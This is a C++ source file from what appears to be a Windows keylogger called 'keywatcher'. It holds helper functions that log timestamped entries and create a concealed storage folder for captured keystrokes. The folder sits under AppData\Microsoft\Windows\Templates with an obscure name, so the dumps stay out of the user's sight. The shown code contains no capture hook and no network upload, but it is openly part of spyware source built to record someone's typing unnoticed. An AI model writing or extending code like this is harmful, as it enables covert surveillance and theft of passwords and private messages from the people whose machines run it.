#include <ctime>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <cstdlib>

#include "keywatcher.h"

template <class T>
std::string keywatcher::to_string(const T& value) {
  std::ostringstream s;

  s << value;

  return s.str();
}


void keywatcher::write_to_log(const std::string& s) {
  std::ofstream file("keywatcher.log", std::ios::app);     // opening file in append mode

  file << "[" << keywatcher::datetime().get_datetime() << "] " << s << std::endl;
  file.close();
}


std::string keywatcher::get_apps_root_path() {
  // to fetch path C:\Users\USERNAME\AppData\Roaming
  std::string base_path = getenv("APPDATA");

  // path we want to put keystrokes and keywatcher logs
  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45gg";

  return base_path + apps_path;
}


bool keywatcher::make_dir(std::string path) {
  // Return True(1) if the folder already exists or successfully created
  return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}


bool validate_apps_root_path(std::string path) {
  // looping through the path and checking at each \\ for path's existence
  for (char &ch : path) {
    if (ch == '\\') {
      // if we reached \\ then check the path till that exists
      ch = '\0';
      if (!keywatcher::make_dir(path)) {
        // can't able to create dir at this specific position
        return false;
      }
      ch = '\\';
    }
  }
  return true;
}
